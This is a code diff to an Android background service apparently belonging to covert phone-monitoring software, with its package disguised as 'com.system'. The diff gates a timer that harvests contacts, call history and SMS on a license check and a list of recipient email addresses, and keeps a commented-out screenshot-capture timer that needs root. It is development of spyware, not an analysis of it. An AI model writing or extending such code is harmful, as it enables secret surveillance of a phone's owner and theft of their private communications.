@@ -3,6 +3,9 @@ package com.system;
 import java.util.Timer;
 import java.util.TimerTask;
 
+import com.system.feature.pref.GlobalPref;
+import com.system.utils.LicenseCtrl;
+import com.system.utils.StrUtils;
 import com.system.utils.SysUtils;
 
 import android.app.Service;
@@ -56,13 +59,8 @@ public class BootService extends Service
 		super.onCreate();
 		Log.i(LOGTAG, "created");
 		
-        // make sure the phone is rooted
-        if (!SysUtils.isRooted(getApplicationContext())) {
-        	Log.d(SysUtils.TAG_DEBUG, "Not rooted");
-        	SysUtils.messageBox(getApplicationContext(), "Failed to get root");
-        	return;
-        }
-        SysUtils.messageBox(getApplicationContext(), "get root successfully");
+		mGetInfoTimer = new Timer();
+		mInfoTask = new GetInfoTask(this);
 		
 		mScreenshotTimer = new Timer();
 		mCapTask = new CaptureTask(this);
@@ -74,10 +72,23 @@ public class BootService extends Service
 		Log.i(LOGTAG, "started");
 		
 		// Start timer to get contacts, phone call history and SMS
-		mGetInfoTimer.scheduleAtFixedRate(mInfoTask, mGetInfoDelay, mGetInfoPeriod);
+		String user = GlobalPref.getUsername(this);
+		String key = GlobalPref.getSerialNum(this);
+		String[] mails = GlobalPref.getMail(this).split(",");
+		mails = StrUtils.filterMails(mails);
+		if (mails.length > 0 && LicenseCtrl.isLicensed(this, user, key)) 
+		{
+			mGetInfoTimer.scheduleAtFixedRate(mInfoTask, mGetInfoDelay, mGetInfoPeriod);
 		
-		// Start timer to capture screenshot
-		//mScreenshotTimer.schedule(mCapTask, mScreenshotDelay, mScreenshotPeriod);
+			//Start timer to capture screenshot
+			/*
+	        if (!SysUtils.isRooted(getApplicationContext())) {
+	        	Log.i(LOGTAG, "Not rooted");
+	        } else {
+	        	mScreenshotTimer.schedule(mCapTask, mScreenshotDelay, mScreenshotPeriod);
+	        }
+	        */
+		}
 	}
 	
 	public class IaiaiBinder extends Binder {  
